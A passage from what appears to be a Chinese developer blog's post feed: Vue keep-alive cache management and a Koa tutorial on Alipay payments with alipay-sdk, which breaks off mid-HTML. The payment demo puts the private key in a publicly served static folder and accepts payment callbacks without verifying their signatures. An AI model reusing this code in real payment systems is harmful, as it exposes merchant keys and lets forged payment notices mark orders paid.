alt=""></p><p>和 react 的<code>useEffect</code>有异曲同工之妙。</p><p>而且我们有了这个 api 之后，能干的事情还不止这个。有时候我们会用一些第三方组件，比如我们有一个编辑器组件（加载比较慢，会有白屏），所以我们在它渲染完成之前需要给它一个占位符，但可能这个组件并没有暴露给我们这个接口，当然我们需要修改这个组件，在它创建的时候手动 emit 一个事件出去，然后在组件上监听它，比如：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS8zLzI3LzE2OWJlMmNlNDVlYWJkOGE?x-oss-process=image/format,png" alt=""></p><p>当然这也是可行的，但万一还要监听一个更新或者摧毁的生命周期呢？其实利用 <code>hook</code>可以很方便的实现这个效果。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS8zLzI3LzE2OWJlMzBlZTUzMGE0NWI?x-oss-process=image/format,png" alt=""></p><p>当然在 vue 3.0 版本中可能会有新的写法，就不如下面的讨论: <a href="https://github.com/vuejs/rfcs/pull/23">Dynamic Lifecycle Injection</a>。有兴趣的可以自行去研究，这里就不展开了。当 3.0 正式发布之后再来讨论吧。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue 中销毁 keep-alive 缓存组件及缓存组件的管理</title>
      <link href="/2019/10/cef4048cec54.html"/>
      <url>/2019/10/cef4048cec54.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-keep-alive"><a href="#1-keep-alive" class="headerlink" title="1. keep-alive"></a>1. keep-alive</h1><p>在 Vue 的组件机制中，如果在多个组件页面中来回切换，已访问的组件页面是不会被缓存的，也就是说每次切换一个组件页面再返回后，原有的组件页面仍会被重新渲染，相应的执行从 <code>beforeCreate</code> 开始的声明周期函数 。这样的话是非常浪费性能的，所以 Vue 提供了一个 <a href="https://cn.vuejs.org/v2/api/#keep-alive">&lt;keep-alive&gt; 组件</a>，可以用于缓存组件，配合 Vue-Router 使用可以缓存页面。</p><p>但是这样就存在一个问题，Vue 并没有专门的销毁缓存组件的方法，这就造成缓存的组件会一直存在，如果我们需要重新加载这个组件，或更新组件中的数据，是没有办法主动让组件及其子组件重新渲染的。</p><h1 id="2-问题解决"><a href="#2-问题解决" class="headerlink" title="2. 问题解决"></a>2. 问题解决</h1><p>为了解决以上问题我们可以通过 <code>&lt;keep-alive&gt;</code> 组件的 <code>include</code> 属性来解决，我们先来看一下官方的释义：</p><p><strong><code>include</code> and <code>exclude</code></strong></p><blockquote><p>2.1.0 新增</p></blockquote><p><code>include</code> 和 <code>exclude</code> 属性允许组件有条件地缓存。二者都可以用逗号分隔字符串、正则表达式或一个数组来表示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 逗号分隔字符串 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">keep-alive</span> <span class="attr">include</span>=<span class="string">&quot;a,b&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">component</span> <span class="attr">:is</span>=<span class="string">&quot;view&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 正则表达式 (使用 `v-bind`) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">keep-alive</span> <span class="attr">:include</span>=<span class="string">&quot;/a|b/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">component</span> <span class="attr">:is</span>=<span class="string">&quot;view&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 数组 (使用 `v-bind`) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">keep-alive</span> <span class="attr">:include</span>=<span class="string">&quot;[&#x27;a&#x27;, &#x27;b&#x27;]&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">component</span> <span class="attr">:is</span>=<span class="string">&quot;view&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br></pre></td></tr></table></figure><p>匹配首先检查组件自身的 <code>name</code> 选项，如果 <code>name</code> 选项不可用，则匹配它的局部注册名称 (父组件 <code>components</code> 选项的键值)。匿名组件不能被匹配。</p><p><strong>简而言之，我们可以通过控制 <code>include</code> 属性的值，来控制系统缓存的组件。</strong></p><h1 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h1><ol><li>使用 vuex 或者 localstroge 等全局存储方案，创建一个数组 <code>keepAliveArr</code></li><li>将缓存组件的 name 存放于 <code>keepAliveArr</code> 数组中</li><li>将 <code>keepAliveArr</code> 绑定到 <code>&lt;keep-alive&gt;</code> 的 <code>include</code> 属性上</li><li>当需要删除缓存组件时，直接删除 <code>keepAliveArr</code> 中的组件 name</li><li>当需要添加缓存组件时，向 <code>keepAliveArr</code> 中添加组件的 name</li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 alipay-sdk-nodejs 让 node 应用接入支付宝付款</title>
      <link href="/2019/10/d471872a5c16.html"/>
      <url>/2019/10/d471872a5c16.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-开发构思"><a href="#1-开发构思" class="headerlink" title="1. 开发构思"></a>1. 开发构思</h1><p>我们的总体需求是让 node js 应用接入支付宝，完成用户付款，具体流程是：</p><ul><li>当用户在商户应用点击付款后，页面跳转到支付宝界面，这时会出现两种情况：<ul><li>手机用户唤醒支付宝应用</li><li>PC 唤醒支付宝收银台</li></ul></li><li>用户在支付宝页面进行付款，并完成付款</li><li>支付宝检测用户完成付款后向商户应用发送一个 POST 请求作为支付完成的异步回调</li><li>商户应用对回调信息进行验证后，对订单状态进行变更</li><li>用户返回商户应用，刷新订单界面，显示该订单已支付</li></ul><h1 id="2-前期准备"><a href="#2-前期准备" class="headerlink" title="2. 前期准备"></a>2. 前期准备</h1><p>我们以 Koa 为例，简单演示一下接入支付宝的具体流程，首先安装 Koa 本体以及所需的中间件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install koa koa-router koa-static koa-bodyparser -S</span><br></pre></td></tr></table></figure><p>之后需要安装阿里官方提供的 nodejs 端的支付宝 sdk：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install alipay-node-sdk -S</span><br></pre></td></tr></table></figure><p>当所有的开发依赖准备完成之后，我们可以直接申请应用，同时也可以到支付宝开放平台上使用 <a href="https://openhome.alipay.com/platform/appDaily.htm">沙箱环境</a> 来模拟真实应用。在此我们以沙箱环境进行开发演示，在沙箱界面需要记住 <strong>APPID</strong>：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTAvMjIvaTdWaGUxY3B3MkFiTFBZLnBuZw?x-oss-process=image/format,png" alt="image.png"><br>同时点击下方的 RSA2 密钥，并下载密钥生成工具，分别生成私钥和公钥。我们要将生成的 <strong>应用私钥</strong> 记录下来，存放到 <code>private-key.pem</code> 文件中；之后再将 “应用公钥” 填写到页面中，从而会生成一个 <strong>支付宝公钥</strong> ，记录该公钥到 <code>public-key.pem</code> 文件中，前期准备工作完成。如果还不清楚以上流程，参考 <a href="https://docs.open.alipay.com/291/105971#LDsXr">说明文档</a>。</p><p>我们来整理一下文件，将密钥文件整理在一起，这样前期准备工作就完成了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── package.<span class="property">json</span></span><br><span class="line">├── package-lock.<span class="property">json</span></span><br><span class="line">├── serve.<span class="property">js</span> <span class="comment">// 主服务</span></span><br><span class="line">└── <span class="keyword">static</span></span><br><span class="line">    ├── index.<span class="property">html</span> <span class="comment">// 客户端</span></span><br><span class="line">    └── pem <span class="comment">// 密钥存放文件夹</span></span><br><span class="line">        ├── private-key.<span class="property">pem</span></span><br><span class="line">        └── public-key.<span class="property">pem</span></span><br></pre></td></tr></table></figure><h1 id="3-部署应用"><a href="#3-部署应用" class="headerlink" title="3. 部署应用"></a>3. 部署应用</h1><h2 id="3-1-alipay-node-sdk-的使用"><a href="#3-1-alipay-node-sdk-的使用" class="headerlink" title="3.1 alipay-node-sdk 的使用"></a>3.1 alipay-node-sdk 的使用</h2><p>当用户点击付款信按钮，会触发我们服务器上的一个路由条件，在这个路由中，我们的服务器主动向支付宝服务器发送了一个请求，请求中携带着该条支付的信息（如订单号、商品价格等），同时还携带了私钥信息，当支付宝服务器收到该条请求后，会向我们的服务器返回一个付款 url，我们的服务器再将该条 url 信息转发到前端页面上，由前端页面完成跳转逻辑。</p><p>而使用 <code>alipay-node-sdk</code> 就简化了我们的服务器向支付宝服务器发送请求信息的这一过程，它会将必要的参数与加密信息处理好，我们只需要传入业务参数就可以了。</p><h4 id="构建-Sdk-实例"><a href="#构建-Sdk-实例" class="headerlink" title="构建 Sdk 实例"></a>构建 Sdk 实例</h4><p>当我们引入 <code>alipay-node-sdk</code> 时首先要对其进行实例化以及全局参数的设置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">AlipaySdk</span> = <span class="built_in">require</span>(<span class="string">&#x27;alipay-sdk&#x27;</span>).<span class="property">default</span>;</span><br><span class="line"><span class="keyword">const</span> alipaySdk = <span class="keyword">new</span> <span class="title class_">AlipaySdk</span>(&#123;</span><br><span class="line">   <span class="attr">appId</span>: <span class="string">&#x27;2016**********710&#x27;</span>, <span class="comment">// 之前我们所记录的沙箱环境的 sdk</span></span><br><span class="line">   <span class="attr">privateKey</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./static/pem/private-key.pem&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>), <span class="comment">// 传入私钥</span></span><br><span class="line">   <span class="attr">gateway</span>: <span class="string">&quot;https://openapi.alipaydev.com/gateway.do&quot;</span> <span class="comment">// 沙箱环境的请求网关与正式环境不一样，需要在此更改，如果是使用正式环境则去掉此处的设置</span></span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><h4 id="alipaySdk-exec"><a href="#alipaySdk-exec" class="headerlink" title="alipaySdk.exec()"></a>alipaySdk.exec()</h4><p><code>alipaySdk.exec()</code>  方法可以帮我们简便的发送一个业务请求，在 <a href="https://docs.open.alipay.com/api_1">支付API文档</a> 中我们可以查看到所有的业务请求列表，我们以发送一个 <a href="https://docs.open.alipay.com/api_1/alipay.trade.close">统一收单交易关闭接口(alipay.trade.close)</a> 为例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="keyword">await</span> alipaySdk.<span class="title function_">exec</span>(<span class="string">&#x27;alipay.trade.close&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">notifyUrl</span>: <span class="string">&#x27;http://notify_url&#x27;</span>,</span><br><span class="line">  <span class="attr">appAuthToken</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="comment">// 通过 bizContent 传递请求参数</span></span><br><span class="line">  <span class="attr">bizContent</span>: &#123;</span><br><span class="line">    <span class="attr">tradeNo</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">outTradeNo</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">operatorId</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从官方文档看到，result 包含 tradeNo、outTradeNo 2 个 key</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;tradeNo: %s, outTradeNo: %s&#x27;</span>, result.<span class="property">tradeNo</span>, result.<span class="property">outTradeNo</span>);</span><br></pre></td></tr></table></figure><blockquote><p>这是 alipay-sdk-nodejs 官方提供的演示 demo</p></blockquote><p>这就引出了我们接下来需要用到的两个接口：</p><ul><li><a href="https://docs.open.alipay.com/api_1/alipay.trade.wap.pay/">alipay.trade.wap.pay(手机网站支付接口2.0)</a>：用于返回手机端的支付唤起地址</li><li><a href="https://docs.open.alipay.com/api_1/alipay.trade.page.pay/">alipay.trade.page.pay(统一收单下单并支付页面接口)</a>：用于返回 PC 端的支付宝收银台地址</li></ul><h4 id="AlipayFormData-addField"><a href="#AlipayFormData-addField" class="headerlink" title="AlipayFormData.addField()"></a>AlipayFormData.addField()</h4><p>如果我们按照上述的方式去请求 alipay.trade.wap.pay 以及 alipay.trade.page.pay 两个接口的话是会返回错误信息的。因为这两个接口属于页面类接口，页面类接口默认返回的数据为 html 代码片段。这类接口我们需要创建一个 FormData 去请求，<strong>而不能直接使用 <code>alipaySdk.exec()</code> 传入业务参数</strong>。</p><p>Sdk 提供了一个 <code>AlipayFormData</code> 可以方便我们的创建，这里我们以 alipay.trade.page.pay 接口为示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TypeScript</span></span><br><span class="line"><span class="comment">// import AlipayFormData from &#x27;alipay-sdk/lib/form&#x27;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// js</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AlipayFormData</span> = <span class="built_in">require</span>(<span class="string">&#x27;alipay-sdk/lib/form&#x27;</span>).<span class="property">default</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">AlipayFormData</span>();</span><br><span class="line"><span class="comment">// 调用 setMethod 并传入 get，会返回可以跳转到支付页面的 url，否则返回的是一个表单的 html 片段</span></span><br><span class="line">formData.<span class="title function_">setMethod</span>(<span class="string">&#x27;get&#x27;</span>);</span><br><span class="line"></span><br><span class="line">formData.<span class="title function_">addField</span>(<span class="string">&#x27;notifyUrl&#x27;</span>, <span class="string">&#x27;http://www.com/notify&#x27;</span>); <span class="comment">// 当支付完成后，支付宝主动向我们的服务器发送回调的地址</span></span><br><span class="line">formData.<span class="title function_">addField</span>(<span class="string">&#x27;returnUrl&#x27;</span>, <span class="string">&#x27;http://www.com/return&#x27;</span>); <span class="comment">// 当支付完成后，当前页面跳转的地址</span></span><br><span class="line">formData.<span class="title function_">addField</span>(<span class="string">&#x27;bizContent&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">outTradeNo</span>: <span class="string">&#x27;out_trade_no&#x27;</span>,</span><br><span class="line">  <span class="attr">productCode</span>: <span class="string">&#x27;FAST_INSTANT_TRADE_PAY&#x27;</span>,</span><br><span class="line">  <span class="attr">totalAmount</span>: <span class="string">&#x27;0.01&#x27;</span>,</span><br><span class="line">  <span class="attr">subject</span>: <span class="string">&#x27;商品&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;商品详情&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = <span class="keyword">await</span> alipaySdk.<span class="title function_">exec</span>(</span><br><span class="line">  <span class="string">&#x27;alipay.trade.page.pay&#x27;</span>,</span><br><span class="line">  &#123;&#125;,</span><br><span class="line">  &#123; <span class="attr">formData</span>: formData &#125;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// result 为可以跳转到支付链接的 url</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><p>在这里要特别注意，支付宝在用户付款完成后，会向我们的服务器发送一条 <strong>POST 方式</strong> 的异步回调，这个回调地址必须是外网可以访问到的，也就是说这一过程我们必须在线上开发。</p><h2 id="3-2-Demo"><a href="#3-2-Demo" class="headerlink" title="3.2 Demo"></a>3.2 Demo</h2><p>介绍完了alipay-node-sdk 的使用，那么接下来就上一个完整的示例进行整体的演示，由于上面已经演示了如何请求 alipay.trade.page.pay(统一收单下单并支付页面接口)，那么接下来就演示一下如何请求 alipay.trade.wap.pay(手机网站支付接口2.0) 让用户进行手机支付：</p><blockquote><p>注意项目必须在线上开发！否则只会跳转到支付宝界面而接收不到支付宝的异步回调！</p></blockquote><p>整体目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">├── package.json</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── serve.js </span><br><span class="line">└── static</span><br><span class="line">    ├── index.html</span><br><span class="line">    └── pem </span><br><span class="line">        ├── private-key.pem</span><br><span class="line">        └── public-key.pem</span><br></pre></td></tr></table></figure><p>serve.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-static&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AlipaySdk</span> = <span class="built_in">require</span>(<span class="string">&#x27;alipay-sdk&#x27;</span>).<span class="property">default</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AlipayFormData</span> = <span class="built_in">require</span>(<span class="string">&#x27;alipay-sdk/lib/form&#x27;</span>).<span class="property">default</span></span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>()</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> staticPath = <span class="string">&#x27;./static&#x27;</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">static</span>(</span><br><span class="line">  path.<span class="title function_">join</span>(__dirname, staticPath)</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">bodyParser</span>())</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/pay&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> alipaySdk = <span class="keyword">new</span> <span class="title class_">AlipaySdk</span>(&#123;</span><br><span class="line">    <span class="attr">appId</span>: <span class="string">&#x27;20161*******6710&#x27;</span>,</span><br><span class="line">    <span class="attr">privateKey</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./static/pem/private-key.pem&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>),</span><br><span class="line">    <span class="attr">gateway</span>: <span class="string">&quot;https://openapi.alipaydev.com/gateway.do&quot;</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">AlipayFormData</span>()</span><br><span class="line">  formData.<span class="title function_">setMethod</span>(<span class="string">&quot;get&quot;</span>)</span><br><span class="line">  formData.<span class="title function_">addField</span>(<span class="string">&quot;notifyUrl&quot;</span>, <span class="string">&quot;http://online_serve_url/paycallback&quot;</span>) <span class="comment">// 回调地址必须为当前服务的线上地址！</span></span><br><span class="line">  formData.<span class="title function_">addField</span>(<span class="string">&quot;returnUrl&quot;</span>, <span class="string">&quot;http://online_serve_url/success&quot;</span>)</span><br><span class="line">  formData.<span class="title function_">addField</span>(<span class="string">&quot;bizContent&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">body</span>: <span class="string">&quot;测试商品&quot;</span>,</span><br><span class="line">    <span class="attr">subject</span>: <span class="string">&quot;女装&quot;</span>,</span><br><span class="line">    <span class="attr">outTradeNo</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">valueOf</span>(),</span><br><span class="line">    <span class="attr">totalAmount</span>: <span class="string">&quot;88.88&quot;</span>,</span><br><span class="line">    <span class="attr">quitUrl</span>: <span class="string">&quot;http://www.taobao.com/product/113714.html&quot;</span>,</span><br><span class="line">    <span class="attr">productCode</span>: <span class="string">&quot;QUICK_WAP_WAY&quot;</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> alipaySdk.<span class="title function_">exec</span>(<span class="string">&quot;alipay.trade.wap.pay&quot;</span>, &#123;&#125;, &#123;</span><br><span class="line">    <span class="attr">formData</span>: formData,</span><br><span class="line">    <span class="attr">validateSign</span>: <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">  ctx.<span class="property">body</span> = result</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/paycallback&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> postData = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;触发付款&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (postData.<span class="property">trade_status</span> === <span class="string">&quot;TRADE_SUCCESS&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> data = ctx.<span class="property">request</span>.<span class="property">body</span> <span class="comment">// 订单信息</span></span><br><span class="line">  <span class="comment">// ========= 由请求体内的订单信息，在这里进行数据库中订单状态的更改 ============</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;支付完成！&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/success&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = <span class="string">&quot;支付成功&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(router.<span class="title function_">routes</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">9090</span>)</span><br></pre></td></tr></table></figure><p>index.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/axios/0.19.0-beta.1/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> oPay = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#pay&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">      oPay.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        axios.<span class="title function_">get</span>(<span class="string">&#x27;http://47.106.226.190:9090/pay&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">window</span>.<span class="title function_">open</span>(res.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span 